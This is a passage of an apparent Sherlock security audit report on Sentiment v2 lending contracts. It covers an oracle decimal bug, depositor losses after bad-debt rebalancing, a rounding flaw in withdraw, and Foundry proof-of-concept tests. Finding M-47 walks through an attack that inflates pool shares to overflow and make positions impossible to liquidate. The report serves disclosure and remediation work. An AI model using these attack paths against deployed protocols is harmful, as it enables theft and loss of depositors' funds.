0x5chn0uf, 0xAlix2, A2-security, Chad0, JCN, KupiaSec, Obsidian, Ryonen, Tendency, ZeroTrust, admin, cawfree, chaduke, codertjay, h2134, hash, robertodf, tvdung94
## Summary
Incorrect decimal adjustment in `ChainlinkUsdOracle`

## Vulnerability Detail
When adjusting for the decimals, the bracks are ommitted causing incorrect division
```solidity
    function getValueInEth(address asset, uint256 amt) external view returns (uint256) {
        
        ....

        if (decimals <= 18) return (amt * 10 ** (18 - decimals)).mulDiv(uint256(assetUsdPrice), uint256(ethUsdPrice));
=>      else return (amt / (10 ** decimals - 18)).mulDiv(uint256(assetUsdPrice), uint256(ethUsdPrice));
    }
```

Eg:
Decimals was 19, then instead of dividing by 10**(19-18), the division will be performed by ~10**19 itself. Casuing massive loss in the value

## Impact
Incorrect valuation of assets breaking every calculation dependent on it, for eg: debt valuation,collateral valuation etc.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/oracle/ChainlinkUsdOracle.sol#L86

## Tool used
Manual Review

## Recommendation
Change to 10 ** (decimals - 18)

# Issue M-46: New depositors can loose their assets due to existing shares when totalAssets is 0 following a bad debt rebalance 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/584 

## Found by 
Nihavent, S3v3ru5, hash
## Summary
New depositors can loose their assets due to existing shares even when totalAssets is 0

## Vulnerability Detail
Having 0 totalAssets and non-zero shares is a possible scenario due to rebalacne
```solidity
    function rebalanceBadDebt(uint256 poolId, address position) external {
        
        ....
        //@auidt decreases totalDepositAssets while shares can be non-zero
        uint256 totalDepositAssets = pool.totalDepositAssets;
        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
```

In such a case, if a new user deposits, it will not revert but instead mint shares 1:1 with the assets. But as soon as it is minted, the value of the user's share will decrease because of the already existing shares

```solidity
    function deposit(uint256 poolId, uint256 assets, address receiver) public returns (uint256 shares) {
        
        ....

        shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Down);
```

```solidity
    function _convertToShares(
        uint256 assets,
        uint256 totalAssets,
        uint256 totalShares,
        Math.Rounding rounding
    ) internal pure returns (uint256 shares) {
        if (totalAssets == 0) return assets;
        shares = assets.mulDiv(totalShares, totalAssets, rounding);
    }
```

Eg:
deposit shares = 100, deposit assets = 100, borrow assets = 100
borrow position becomes bad debt and rebalance bad debt is invoked
now deposit shares = 100, deposit assets = 0
new user calls deposit with 100 assets
they get 100 shares in return but share value is now 0.5 and they can withdraw only 50

This can occur if a large position undergoes a rebalance and the others manage to withdraw their assets right before the rebalance (superpool dominated pools can higher chances of such occurence) 

## Impact
Users can loose their assets when depositing to pools that have freshly undergone rebalanceBadDebt

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L275

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L547

## Tool used
Manual Review

## Recommendation
If totalShares is non-zero and totalAssets is zero, revert for deposits

# Issue M-47: User's can create non-liquidateable positions by leveraging `rebalanceBadDebt` to decrease share price 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/585 

## Found by 
hash
## Summary
User's can create non-liquidateable positions by leveraging `rebalanceBadDebt` to decrease share price

## Vulnerability Detail
The `rebalanceBadDebt` function decreases the deposit assets while the deposit shares are kept the same

```solidity
    function rebalanceBadDebt(uint256 poolId, address position) external {
        
        ....

        // rebalance bad debt across lenders
        pool.totalBorrowShares = totalBorrowShares - borrowShares;
        // handle borrowAssets being rounded up to be greater than totalBorrowAssets
        pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
        uint256 totalDepositAssets = pool.totalDepositAssets;
        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
        borrowSharesOf[poolId][position] = 0;
```

The deflates the value of a depositors share and hence a deposit afterwards will lead to a massive amount of shares being minted. An attacker can leverage this to create pools such that the total share amount will become ~type(uint.max). After this any query to many of the pool's functions including `getBorrowsOf` will revert due to the overflow. This can be used to create positions that borrow from other pools and cannot be liquidated

Eg:
attacker creates a pool for with with 1e18 assets and 1e18 shares
attacker borrows 1e18 - 1. the position goes into bad debt and `rebalanceBadDebt` is invoked
now assets left = 1 and shares = 1e18
attacker deposits 1e18 tokens and gets 1e36 tokens in return
attacker repeates the process by borrowing 1e18 tokens, being in bad debt, getting `rebalanceBadDebt` invoked and delfating the share value

since the attacker has full control over the increase by choosing the deposit amount, they can make it reach a value near type(uint).max
followed by a borrow from this infected pool and from other pools from which they attacker really wanted to borrow
after some time, the interest increase will make the corresponding fee share cause overflow for the pool shares and hence the `getBorrowsOf` and `isPositionHealthy` functions to revert preventing liquidations of the attackers position

## Impact
User's can create unliquidateable positions and make protocol accrue bad debt/depositors from other pools loose assets

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L547

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/RiskModule.sol#L212-L213

## Tool used
Manual Review

## Recommendation
Can't think of any good solution if a position has to have the ability to borrow from multiple pools using the same collateral backing

# Issue M-48: Calculation issue will impact in loss in user funds and DOS 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/601 

## Found by 
Darinrikusham
### Summary

In withdraw function in pool.sol contract while calculating amount of shares it is rounding up which results in loss in user funds and DOS as user will not be able to fully withdraw the deposited assets and Superpool is also not compliant with ERC 4626.

### Root Cause

The choice to round up on [pool.sol:350](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350) is a mistake as it results in loss of user funds and DOS as user can't withdraw the full asset amount. It also affects withdraw function in SuperPool.sol as underneath it calls withdraw function on pool.sol

### Internal pre-conditions

It will happen in all scenarios after interest is accrued and peg is not 1:1 between assets and shares.

### External pre-conditions

_No response_

### Attack Path

1. In [testTimeIncreasesDebt](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/test/core/Pool.t.sol#L217) test case after time is elapsed, debt is increased and interest is accrued if a user deposits funds and later tries to withdraw all the funds they are not able to withdraw it all due to issue in calculation

### Impact

The user loose a part of deposited asset amount and can't withdraw the deposited amount fully causing [withdraw](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L339) function unusable to withdraw all assets and also cause the same DOS issue in superPool withdraw function. 

### PoC

In Pool.t.sol
```solidity
function testTimeIncreasesDebt(uint96 assets) public {
        testBorrowWorksAsIntended(assets);

        (,,,,,,, uint256 totalBorrowAssets, uint256 totalBorrowShares,,) = pool.poolDataFor(linearRatePool);
        console.log("totalBorrowAssets -> ", totalBorrowAssets);
        console.log("totalBorrowShares -> ", totalBorrowShares);

        uint256 time = block.timestamp + 1 days;
        vm.warp(time + 86_400 * 7);
        vm.roll(block.number + ((86_400 * 7) / 2));

        pool.accrue(linearRatePool);

        (,,,,,,, uint256 newTotalBorrowAssets, uint256 newTotalBorrowShares,,) = pool.poolDataFor(linearRatePool);
        console.log("newTotalBorrowAssets -> ", newTotalBorrowAssets);
        console.log("newTotalBorrowShares -> ", newTotalBorrowShares);
        console.log("shares first -> ", pool.balanceOf(user, linearRatePool));
        console.log("assets -> ",assets);

        (uint256 depositedEarlier) = pool.getAssetsOf(linearRatePool, user);
        console.log("assets in pool before ->", depositedEarlier);
        // (uint256 liquidity) = pool.getPoolAssetFor(linearRatePool);
        // console.log("total assets in pool ->", liquidity);

        vm.startPrank(user2);
        asset1.mint(user2, assets);
        asset1.approve(address(pool), assets);
        (uint256 sharesBefore) = pool.deposit(linearRatePool, assets, user2);
        console.log("shares minted on deposit -> ", sharesBefore);
        (uint256 sharesAfter) = pool.withdraw(linearRatePool, assets, user2, user2);
        console.log("shares burned on withdraw -> ", sharesAfter);
        vm.stopPrank();

        (uint256 deposited) = pool.getAssetsOf(linearRatePool, user);
        console.log("total assets deposited ->", deposited);

        assertEq(sharesBefore, sharesAfter);
        assertEq(newTotalBorrowShares, totalBorrowShares);
        assertGt(newTotalBorrowAssets, totalBorrowAssets);
    }
```

In Superpool.t.sol

```solidity
function testInterestEarnedOnTheUnderlingPool() public {
        // 1. Setup a basic pool with an asset1
        // 2. Add it to the superpool
        // 3. Deposit assets into the pool
        // 4. Borrow from an alternate account
        // 5. accrueInterest
        // 6. Attempt to withdraw all of the liquidity, and see the running out of the pool
        vm.startPrank(poolOwner);
        superPool.addPool(linearRatePool, 50 ether);
        superPool.addPool(fixedRatePool, 50 ether);
        vm.stopPrank();

        vm.startPrank(user);
        asset1.mint(user, 50 ether);
        asset1.approve(address(superPool), 50 ether);

        vm.expectRevert();
        superPool.deposit(0, user);

        superPool.deposit(50 ether, user);
        vm.stopPrank();

        vm.startPrank(Pool(pool).positionManager());
        Pool(pool).borrow(linearRatePool, user, 35 ether);
        vm.stopPrank();

        vm.warp(block.timestamp + 365 days);
        vm.roll(block.number + 5_000_000);
        pool.accrue(linearRatePool);

        vm.startPrank(user2);
        asset1.mint(user2, 421 ether);
        asset1.approve(address(superPool), 421 ether);

        (uint256 sharesMinted) = superPool.deposit(421 ether, user2);
        console.log("Shares Minted ->", sharesMinted);
        (uint256 sharesBurned) = superPool.withdraw(421 ether, user2, user2);
        console.log("Shares Burned ->", sharesBurned);
        vm.stopPrank();

        vm.startPrank(Pool(pool).positionManager());
        uint256 borrowsOwed = pool.getBorrowsOf(linearRatePool, user);

        asset1.mint(Pool(pool).positionManager(), borrowsOwed);
        asset1.approve(address(pool), borrowsOwed);
        Pool(pool).repay(linearRatePool, user, borrowsOwed);
        vm.stopPrank();

        superPool.accrue();

        vm.startPrank(user);
        vm.expectRevert(); // Not enough liquidity
        superPool.withdraw(40 ether, user, user);
        vm.stopPrank();

        vm.startPrank(poolOwner);
        vm.expectRevert(); // Cant remove a pool with liquidity in it
        superPool.removePool(linearRatePool, false);
        vm.stopPrank();
    }
```

### Mitigation

Changing `Math.Rounding.Up` to `Mat.Rounding.Down` in [Pool.sol:350](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350) solves the issue.

